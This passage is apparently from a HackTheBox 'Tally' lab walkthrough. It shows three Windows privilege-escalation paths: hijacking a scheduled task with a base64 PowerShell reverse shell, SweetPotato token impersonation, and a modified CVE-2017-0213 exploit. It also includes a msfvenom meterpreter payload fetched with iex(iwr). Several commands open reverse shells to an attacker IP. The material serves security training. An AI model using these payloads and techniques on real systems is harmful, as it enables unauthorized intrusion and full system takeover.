+</code></pre></div></div>
+<p>After that, there’s a connection at <code class="language-plaintext highlighter-rouge">nc</code>:</p>
+<div class="language-console rlwrap-disclaimer highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">sudo </span>rlwrap <span class="nt">-cAr</span> nc <span class="nt">-lvnp</span> 445
+<span class="go">Listening on 0.0.0.0 445
+Connection received on 10.10.10.59 59874
+</span><span class="gp">SHELL&gt;</span><span class="w"> </span><span class="nb">whoami</span>
+<span class="go">tally\sarah
+</span></code></pre></div></div>
+<h2 id="shell-as-administrator-task---path-1">Shell as Administrator [Task - path 1]</h2>
+<h3 id="enumeration-1">Enumeration</h3>
+<p>On the desktop there’s a bunch of other files:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\users\sarah\desktop&gt;</span><span class="w"> </span><span class="n">ls</span><span class="w">
+</span><span class="go">
+    Directory: C:\users\sarah\desktop
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---       01/10/2017     22:32            916 browser.bat
+-a----       17/09/2017     21:50            845 FTP.lnk
+-a----       23/09/2017     21:11            297 note to tim (draft).txt
+-a----       19/10/2017     21:49          17152 SPBestWarmUp.ps1
+-a----       19/10/2017     22:48          11010 SPBestWarmUp.xml
+-a----       17/09/2017     21:48           1914 SQLCMD.lnk
+-a----       21/09/2017     00:46            129 todo.txt
+-ar---       09/04/2022     11:46             34 user.txt
+-a----       17/09/2017     21:49            936 zz_Migration.lnk  
+</span></code></pre></div></div>
+<p>For this part, I’m interested in <code class="language-plaintext highlighter-rouge">SPBestWarmUp.ps1</code> and <code class="language-plaintext highlighter-rouge">SPBestWarmUp.xml</code>. The former is a PowerShell script, which I believe is actually an older version of <a href="https://github.com/spjeff/spbestwarmup/blob/master/SPBestWarmUp.ps1">this</a>. It’s designed to help with caching on a Windows IIS server. But the contents don’t really matter</p>
+<p><code class="language-plaintext highlighter-rouge">SPBestWarmUp.xml</code> is an exported scheduled task:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="UTF-16"?&gt;</span>
+<span class="nt">&lt;Task</span> <span class="na">version=</span><span class="s">"1.2"</span> <span class="na">xmlns=</span><span class="s">"http://schemas.microsoft.com/windows/2004/02/mit/task"</span><span class="nt">&gt;</span>
+  <span class="nt">&lt;Triggers&gt;</span>
+    <span class="nt">&lt;CalendarTrigger&gt;</span>
+      <span class="nt">&lt;Repetition&gt;</span>
+        <span class="nt">&lt;Interval&gt;</span>PT1H<span class="nt">&lt;/Interval&gt;</span>
+        <span class="nt">&lt;Duration&gt;</span>P1D<span class="nt">&lt;/Duration&gt;</span>
+        <span class="nt">&lt;StopAtDurationEnd&gt;</span>false<span class="nt">&lt;/StopAtDurationEnd&gt;</span>
+      <span class="nt">&lt;/Repetition&gt;</span>
+      <span class="nt">&lt;StartBoundary&gt;</span>2017-01-25T01:00:00<span class="nt">&lt;/StartBoundary&gt;</span>
+      <span class="nt">&lt;Enabled&gt;</span>true<span class="nt">&lt;/Enabled&gt;</span>
+      <span class="nt">&lt;ScheduleByDay&gt;</span>
+        <span class="nt">&lt;DaysInterval&gt;</span>1<span class="nt">&lt;/DaysInterval&gt;</span>
+      <span class="nt">&lt;/ScheduleByDay&gt;</span>
+    <span class="nt">&lt;/CalendarTrigger&gt;</span>
+...[snip]...
+</code></pre></div></div>
+<p>At the top it defines the trigger, which is every hour each day starting at 0100. This is a really slow cron for HTB, but maybe it could still be interesting. There’s also triggers based on event logs that indicate the server ran out of memory.</p>
+<p>Going down a bit, it is set to run as Administrator:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...[snip]...
+  <span class="nt">&lt;Principals&gt;</span>
+    <span class="nt">&lt;Principal</span> <span class="na">id=</span><span class="s">"Author"</span><span class="nt">&gt;</span>
+      <span class="nt">&lt;UserId&gt;</span>TALLY\Administrator<span class="nt">&lt;/UserId&gt;</span>
+      <span class="nt">&lt;LogonType&gt;</span>Password<span class="nt">&lt;/LogonType&gt;</span>
+      <span class="nt">&lt;RunLevel&gt;</span>HighestAvailable<span class="nt">&lt;/RunLevel&gt;</span>
+    <span class="nt">&lt;/Principal&gt;</span>
+  <span class="nt">&lt;/Principals&gt;</span> 
+...[snip]...
+</code></pre></div></div>
+<p>At the very bottom, it shows it runs the PowerShell script:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...[snip]...
+  <span class="nt">&lt;Actions</span> <span class="na">Context=</span><span class="s">"Author"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;Exec&gt;</span>
+      <span class="nt">&lt;Command&gt;</span>PowerShell.exe<span class="nt">&lt;/Command&gt;</span>
+      <span class="nt">&lt;Arguments&gt;</span>-ExecutionPolicy Bypass -File SPBestWarmUp.ps1 -skipadmincheck<span class="err">&lt;</span>/Arguments
+      <span class="nt">&lt;WorkingDirectory&gt;</span>C:\Users\Sarah\Desktop<span class="nt">&lt;/WorkingDirectory&gt;</span>
+    <span class="nt">&lt;/Exec&gt;</span>
+  <span class="nt">&lt;/Actions&gt;</span> 
+...[snip]...
+</code></pre></div></div>
+<p>Also, sarah has full control over this file:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\users\sarah\desktop&gt;</span><span class="w"> </span><span class="n">icacls</span><span class="w"> </span><span class="nx">SPBestWarmUp.ps1</span><span class="w">
+</span><span class="go">SPBestWarmUp.ps1 NT AUTHORITY\SYSTEM:(F)
+                 BUILTIN\Administrators:(F)
+                 TALLY\Sarah:(F)
+
+Successfully processed 1 files; Failed processing 0 files
+</span></code></pre></div></div>
+<h3 id="reverse-shell">Reverse Shell</h3>
+<p>I’ll generate another shell (this time on 444), and (after creating a backup), replace <code class="language-plaintext highlighter-rouge">SPBestWarmUp.ps1</code> with the shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\users\sarah\desktop&gt;</span><span class="w"> </span><span class="n">copy</span><span class="w"> </span><span class="nx">SPBestWarmUp.ps1</span><span class="w"> </span><span class="nx">SPBestWarmUp.ps1.bak</span><span class="w">
+</span><span class="gp">PS C:\users\sarah\desktop&gt;</span><span class="w"> </span><span class="n">echo</span><span class="w"> </span><span class="s2">"powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANgAiACwANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">SPBestWarmUp.ps1</span><span class="w">
+</span></code></pre></div></div>
+<p>When the hour rolls over, it generates a shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 444
+<span class="go">Listening on 0.0.0.0 444
+Connection received on 10.10.10.59 52566
+whoami
+tally\administrator
+</span><span class="gp">PS C:\Users\Sarah\Desktop&gt;</span><span class="w">
+</span></code></pre></div></div>
+<p>I can grab <code class="language-plaintext highlighter-rouge">root.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\users\administrator\desktop&gt;</span><span class="w"> </span><span class="kr">type</span><span class="w"> </span><span class="n">root.txt</span><span class="w">
+</span><span class="go">beca32df************************
+</span></code></pre></div></div>
+<h2 id="shell-as-system-seimpersonate---path-2">Shell as SYSTEM [SeImpersonate - path 2]</h2>
+<h3 id="enumeration-2">Enumeration</h3>
+<p>sarah is running MSSQL, and on Windows, it’s very common for services to run as a user with the <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code>. If I get a shell via MSSQL, sarah has this privilege:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\users\sarah\desktop&gt;</span><span class="w"> </span><span class="n">whoami</span><span class="w"> </span><span class="nx">/priv</span><span class="w">
+</span><span class="go">
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+</span></code></pre></div></div>
+<p>Interestingly, if I get this shell via the FireFox exploit, sarah has many fewer privileges:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">SHELL&gt;</span><span class="w"> </span><span class="nb">whoami</span> /priv
+<span class="go">
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State   
+============================= ============================== ========
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+</span></code></pre></div></div>
+<p>When I originally solved this in 2018, I used <a href="https://github.com/foxglovesec/RottenPotato">RottenPotato</a>. Since then, as Windows blocked various methods for exploiting <code class="language-plaintext highlighter-rouge">SeImpersonate</code>, the exploit has evolved and improved, to <a href="https://github.com/breenmachine/RottenPotatoNG">RottenPotatoNG</a>, <a href="https://github.com/decoder-it/lonelypotato">LonelyPotato</a>, <a href="https://github.com/ohpe/juicy-potato">JuicyPotato</a>, and <a href="https://github.com/antonioCoco/RoguePotato">RoguePotato</a>, as well as exploits like <a href="https://github.com/itm4n/PrintSpoofer">PrintSpoofer</a> and <a href="https://github.com/antonioCoco/RogueWinRM">RogueWinRM</a>.</p>
+<h3 id="sweetpotato">SweetPotato</h3>
+<p>For this time, I’ll show <a href="https://github.com/CCob/SweetPotato">SweetPotato</a>, which is a single tool with a bunch of different <code class="language-plaintext highlighter-rouge">SeImpersonate</code> exploits built in.</p>
+<p>I’ll upload it to Tally using the shell gained via MSSQL:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\programdata&gt;</span><span class="w"> </span><span class="n">iwr</span><span class="w"> </span><span class="nx">10.10.14.6/SweetPotato.exe</span><span class="w"> </span><span class="nt">-outfile</span><span class="w"> </span><span class="nx">sp.exe</span><span class="w">
+</span><span class="gp">PS C:\programdata&gt;</span><span class="w"> </span><span class="n">iwr</span><span class="w"> </span><span class="nx">10.10.14.6/nc64.exe</span><span class="w"> </span><span class="nt">-outfile</span><span class="w"> </span><span class="nx">nc64.exe</span><span class="w">
+</span></code></pre></div></div>
+<p>I’ll also upload <code class="language-plaintext highlighter-rouge">nc64.exe</code>. I’ll start with all the defaults, giving it just a program to run <code class="language-plaintext highlighter-rouge">-p</code> and arguments for that program <code class="language-plaintext highlighter-rouge">-a</code>, generating a reverse shell via <code class="language-plaintext highlighter-rouge">nc64.exe</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\programdata&gt;</span><span class="w"> </span><span class="o">.</span><span class="n">\sp.exe</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="s2">"\programdata\nc64.exe"</span><span class="w"> </span><span class="nt">-a</span><span class="w"> </span><span class="s2">"-e powershell 10.10.14.6 446"</span><span class="w">
+</span><span class="go">SweetPotato by @_EthicalChaos_
+  Original RottenPotato code and exploit by @foxglovesec
+  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery
+  PrintSpoofer discovery and original exploit by @itm4n
+  EfsRpc built on EfsPotato by @zcgonvh and PetitPotam by @topotam
+[+] Attempting NP impersonation using method PrintSpoofer to launch \programdata\nc64.exe
+[+] Triggering notification on evil PIPE \\TALLY/pipe/21e828a2-6bdd-4a23-9b7b-d03d423949a7
+[+] Server connected to our evil RPC pipe
+[+] Duplicated impersonation token ready for process creation
+[+] Intercepted and authenticated successfully, launching program
+[+] Process created, enjoy!
+</span><span class="gp">PS C:\programdata&gt;</span><span class="w"> </span><span class="o">.</span><span class="n">\sp.exe</span><span class="w">
+</span></code></pre></div></div>
+<p>It returns a shell as SYSTEM:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 446
+<span class="go">Listening on 0.0.0.0 446
+Connection received on 10.10.10.59 60044
+Windows PowerShell 
+Copyright (C) 2016 Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32&gt; whoami
+nt authority\system
+</span></code></pre></div></div>
+<h2 id="shell-as-system-cve---path-3">Shell as SYSTEM [CVE - path 3]</h2>
+<h3 id="enumeration-3">Enumeration</h3>
+<h4 id="identify-patch-level-and-cve">Identify Patch Level and CVE</h4>
+<p>Running <code class="language-plaintext highlighter-rouge">systeminfo</code> on the host will give lots of information, including what Hotfixs have been applied:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\programdata&gt;</span><span class="w"> </span><span class="n">systeminfo</span><span class="w">
+</span><span class="go">
+Host Name:                 TALLY
+OS Name:                   Microsoft Windows Server 2016 Standard
+OS Version:                10.0.14393 N/A Build 14393
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Server
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+Registered Organization:   
+Product ID:                00376-30726-67778-AA877
+Original Install Date:     28/08/2017, 15:43:34
+System Boot Time:          10/04/2022, 22:12:01
+System Manufacturer:       VMware, Inc.
+System Model:              VMware Virtual Platform
+System Type:               x64-based PC
+Processor(s):              2 Processor(s) Installed.
+                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
+                           [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
+BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             en-gb;English (United Kingdom)
+Input Locale:              en-gb;English (United Kingdom)
+Time Zone:                 (UTC+00:00) Dublin, Edinburgh, Lisbon, London
+Total Physical Memory:     2,047 MB
+Available Physical Memory: 121 MB
+Virtual Memory: Max Size:  4,095 MB
+Virtual Memory: Available: 729 MB
+Virtual Memory: In Use:    3,366 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    HTB.LOCAL
+Logon Server:              \\TALLY
+Hotfix(s):                 2 Hotfix(s) Installed.
+                           [01]: KB3199986
+                           [02]: KB4015217
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: Intel(R) 82574L Gigabit Network Connection
+                                 Connection Name: Ethernet0
+                                 DHCP Enabled:    No
+                                 IP address(es)
+                                 [01]: 10.10.10.59
+                                 [02]: fe80::7581:5424:c9c4:f41e
+                                 [03]: dead:beef::7581:5424:c9c4:f41e
+                                 [04]: dead:beef::240
+Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
+</span></code></pre></div></div>
+<p>KB4015217 is from <a href="https://support.microsoft.com/en-us/topic/april-11-2017-kb4015217-os-build-14393-1066-and-14393-1083-b5f79067-98bd-b4ec-8b81-5d858d7dc722">11 April 2017</a>, and this box released on 4 November 2017. CVE-2017-0213 was a well know privesc in Windows that became public in May 2017. It’s a bit hard to know this now in 2022, but this is the kind of thing that people would have known about in 2017, and this CVE is actually the intended path for Tally shown in the official HTB writeup.</p>
+<h4 id="note-to-tim">Note to tim</h4>
+<p>On Sarah’s desktop, there’s a <code class="language-plaintext highlighter-rouge">note to tim (draft).txt</code>:</p>
+<blockquote>
+<p>Hi Tim,</p>
+<p>As discussed in the cybersec meeting, malware is often hidden in trusted executables in order to evade detection. I read somewhere that cmd.exe is a common target for backdooring, so I’ve gone ahead and disallowed any cmd.exe outside the Windows folder from executing.</p>
+<p>Thanks,
+Sarah</p>
+</blockquote>
+<p>This is important, because the POCs for CVE-2017-0213 run <code class="language-plaintext highlighter-rouge">cmd.exe</code>, which will either pop a command prompt (which isn’t helpful to me), or, if I place a new binary in the current directory named <code class="language-plaintext highlighter-rouge">cmd.exe</code>, run that. So I could put a reverse shell in my current directory named <code class="language-plaintext highlighter-rouge">cmd.exe</code>, but this says that will be blocked.</p>
+<p>I’ll have to edit and compile the exploit.</p>
+<h3 id="compile">Compile</h3>
+<h4 id="without-edits">Without Edits</h4>
+<p>In my Windows VM, I’ll download <a href="https://www.exploit-db.com/exploits/42020">this C++ source</a> for the exploit. I’ll create a new project in Visual Studio, and add it in as a new file to the project. I always try to build right away to make sure I know if it builds or not before making any changes. This throws an error:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220410205625020.webp" type="image/webp"/>
+<img alt="image-20220410205625020" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220410205625020.png"/>
+</picture>
+<p>Some Goolging for this error finds several Stack Overflow posts, including <a href="https://stackoverflow.com/questions/53242871/start-info-lpdesktop-is-lpwstr-entity-but-it-says-this-is-const-wchat-t">this one</a>, where the user is trying to compile what looks like this exact exploit:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220410205720460.webp" type="image/webp"/>
+<img alt="image-20220410205720460" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220410205720460.png"/>
+</picture>
+<p>[The solution](<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220410205731362.webp" type="image/webp"/>
+<img alt="image-20220410205731362" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220410205731362.png"/>
+</picture>) is to cast that string to an <code class="language-plaintext highlighter-rouge">LPWSTR</code>:</p>
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">start_info</span><span class="p">.</span><span class="n">lpDesktop</span> <span class="o">=</span> <span class="n">LPWSTR</span> <span class="p">(</span><span class="s">L"WinSta0</span><span class="se">\\</span><span class="s">Default"</span><span class="p">);</span>
+</code></pre></div></div>
+<p>After that change, the project builds.</p>
+<h4 id="with-edits">With Edits</h4>
+<p>Instead of <code class="language-plaintext highlighter-rouge">cmd.exe</code>, I’ll just have it run <code class="language-plaintext highlighter-rouge">nc64.exe -e powershell 10.10.14.6 447</code>, which I set just below where that error happened:</p>
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">STARTUPINFO</span> <span class="n">start_info</span> <span class="o">=</span> <span class="p">{};</span>
+    <span class="n">start_info</span><span class="p">.</span><span class="n">cb</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">start_info</span><span class="p">);</span>
+    <span class="n">start_info</span><span class="p">.</span><span class="n">lpDesktop</span> <span class="o">=</span> <span class="n">LPWSTR</span> <span class="p">(</span><span class="s">L"WinSta0</span><span class="se">\\</span><span class="s">Default"</span><span class="p">);</span>
+    <span class="n">PROCESS_INFORMATION</span> <span class="n">proc_info</span><span class="p">;</span>
+    <span class="n">WCHAR</span> <span class="n">cmdline</span><span class="p">[]</span> <span class="o">=</span> <span class="s">L"nc64.exe -e powershell 10.10.14.6 447"</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">CreateProcessAsUser</span><span class="p">(</span><span class="n">new_token</span><span class="p">.</span><span class="n">get</span><span class="p">(),</span> <span class="nb">nullptr</span><span class="p">,</span> <span class="n">cmdline</span><span class="p">,</span>
+        <span class="nb">nullptr</span><span class="p">,</span> <span class="nb">nullptr</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">CREATE_NEW_CONSOLE</span><span class="p">,</span> <span class="nb">nullptr</span><span class="p">,</span> <span class="nb">nullptr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">start_info</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">proc_info</span><span class="p">))</span>
+    <span class="p">{</span>
+        <span class="n">CloseHandle</span><span class="p">(</span><span class="n">proc_info</span><span class="p">.</span><span class="n">hProcess</span><span class="p">);</span>
+        <span class="n">CloseHandle</span><span class="p">(</span><span class="n">proc_info</span><span class="p">.</span><span class="n">hThread</span><span class="p">);</span>
+    <span class="p">}</span>
+</code></pre></div></div>
+<p>I’ll build, and it compiles without error. Based on the fact that the exploit author is referring to EIP in the comments, I’ll build this as x86 (32-bit). Over the course of troubleshooting, I’ll end up trying both, but in the end, x86 is what works.</p>
+<h3 id="get-interactive-process">Get Interactive Process</h3>
+<h4 id="troubleshooting">Troubleshooting</h4>
+<p>Just running the exploit from my current shell will report success, but won’t actually trigger the payload. There’s a handful of variables I can play with to see what might be breaking. There’s no good way to show in a blog post how I worked through these, but I can at least lay out what I consider:</p>
+<ul>
+<li>32-bit vs 64-bit.</li>
+<li>Is it ok to have arguments in the payload?</li>
+<li>Interactive Session</li>
+</ul>
+<h4 id="interactive-sessions">Interactive Sessions</h4>
+<p>Unfortunately for me, I came up with the third option long after playing with the other two for a bit. <a href="https://brianbondy.com/blog/100/understanding-windows-at-a-deeper-level-sessions-window-stations-and-desktops">This article</a> does a good job explaining sessions in depth, but the short bits I need to know here is that Windows groups processes into sessions, and each process belongs to exactly one session. Sessions can be interactive or non-interactive. For modern Windows (Vista+), session 0 is where the NT services are started, and it must be non-interactive. When I user logs in, their processes end up in a new session, which will often be session 1.</p>
+<p>Many exploits that we want to run some other process must be run out of an interactive session. <code class="language-plaintext highlighter-rouge">$PID</code> is the id of the current process, which is in session (<code class="language-plaintext highlighter-rouge">SI</code>) 0:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\programdata&gt;</span><span class="w"> </span><span class="n">get-process</span><span class="w"> </span><span class="nt">-id</span><span class="w"> </span><span class="bp">$PID</span><span class="w">
+</span><span class="go">
+Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                  
+-------  ------    -----      -----     ------     --  -- -----------                                                  
+    590      37    72252      86792       5.06   8488   0 powershell
+</span></code></pre></div></div>
+<h4 id="msf">MSF</h4>
+<p>To migrate, the easiest way to do that is with Metasploit. I’ll generate a Powershell payload with <code class="language-plaintext highlighter-rouge">msfvenom</code> (using a high port so I don’t have to run MSF as root):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>msfvenom <span class="nt">-p</span> windows/x64/meterpreter/reverse_tcp <span class="nt">-f</span> psh <span class="nt">-o</span> met.ps1 <span class="nv">LHOST</span><span class="o">=</span>10.10.14.6 <span class="nv">LPORT</span><span class="o">=</span>4443
+<span class="go">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of psh file: 3249 bytes
+Saved as: met.ps1
+</span></code></pre></div></div>
+<p>I’ll start <code class="language-plaintext highlighter-rouge">msfconsole</code>, <code class="language-plaintext highlighter-rouge">use exploit/multi/handler</code>, set the payload, <code class="language-plaintext highlighter-rouge">LHOST</code>, and <code class="language-plaintext highlighter-rouge">LPORT</code>, and run:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">msf6 exploit(multi/handler) &gt;</span><span class="w"> </span>options
+<span class="go">
+Module options (exploit/multi/handler):                             
+
+   Name  Current Setting  Required  Description                 
+   ----  ---------------  --------  -----------
+
+
+Payload options (windows/x64/meterpreter/reverse_tcp):              
+
+   Name      Current Setting  Required  Description                 
+   ----      ---------------  --------  -----------                 
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)                                       
+   LHOST     10.10.14.6       yes       The listen address (an interface may be specified)
+   LPORT     4443             yes       The listen port
+
+
+Exploit target:                                                
+
+   Id  Name                                                         
+   --  ----
+   0   Wildcard Target
+
+
+</span><span class="gp">msf6 exploit(multi/handler) &gt;</span><span class="w"> </span>run
+</code></pre></div></div>
+<p>Now (with Python web server running), I’ll fetch and run <code class="language-plaintext highlighter-rouge">met.ps1</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\programdata&gt;</span><span class="w"> </span><span class="n">iex</span><span class="p">(</span><span class="n">iwr</span><span class="w"> </span><span class="nx">http://10.10.14.6/met.ps1</span><span class="p">)</span><span class="w">
+</span><span class="go">3088
+</span></code></pre></div></div>
+<p>At MSF, there’s a shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">msf6 exploit(multi/handler) &gt;</span><span class="w"> </span>run
+<span class="go">
+[*] Started reverse TCP handler on 10.10.14.6:4443 
+[*] Sending stage (200262 bytes) to 10.10.10.59
+</span><span class="gp">[*] Meterpreter session 1 opened (10.10.14.6:4443 -&gt;</span><span class="w"> </span>10.10.10.59:53811 <span class="o">)</span> at 2022-04-11 10:12:43 +0000
+<span class="go">
+</span><span class="gp">meterpreter &gt;</span><span class="w"> 
+</span></code></pre></div></div>
+<h4 id="migrate">Migrate</h4>
+<p>I’ll look for a process in session 1 to migrate into by running <code class="language-plaintext highlighter-rouge">ps</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">meterpreter &gt;</span><span class="w"> </span>ps         
+<span class="go">
+Process List          
+============           
+
+ PID    PPID  Name                        Arch  Session  User         Path
+ ---    ----  ----                        ----  -------  ----         ----
+ 0      0     [System Process]
+ 4      0     System
+ 76     580   vmacthlp.exe
+ ...[snip]...
+  4116   5624  firefox.exe                 x86   1        TALLY\Sarah  C:\Program Files (x86)\Mozilla Firefox\firefox.exe
+ 4168   4124  explorer.exe                x64   1        TALLY\Sarah  C:\Windows\explorer.exe
+ 4612   672   ShellExperienceHost.exe     x64   1        TALLY\Sarah  C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe
+ 4712   672   SearchUI.exe                x64   1        TALLY\Sarah  C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\SearchUI.exe
+ 5556   4168  vmtoolsd.exe                x64   1        TALLY\Sarah  C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
+...[snip]...
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">explorer.exe</code> is typically a good target.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">meterpreter &gt;</span><span class="w"> </span>migrate 4168
+<span class="go">[*] Migrating from 8488 to 4168...
+[*] Migration completed successfully.
+</span></code></pre></div></div>
+<h3 id="exploit-1">Exploit</h3>
+<p>From an interactive process, I’ll try the exploit again. I’ll upload the 32-bit version of the exploit that calls <code class="language-plaintext highlighter-rouge">nc64.exe</code> with arguments to <code class="language-plaintext highlighter-rouge">C:\programdata</code> (and <code class="language-plaintext highlighter-rouge">nc64.exe</code> if it’s not there from previous work). Then I’ll run <code class="language-plaintext highlighter-rouge">shell</code> to drop into a <code class="language-plaintext highlighter-rouge">cmd</code> instance from MSF.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">meterpreter &gt;</span><span class="w"> </span>shell
+<span class="go">Process 8416 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
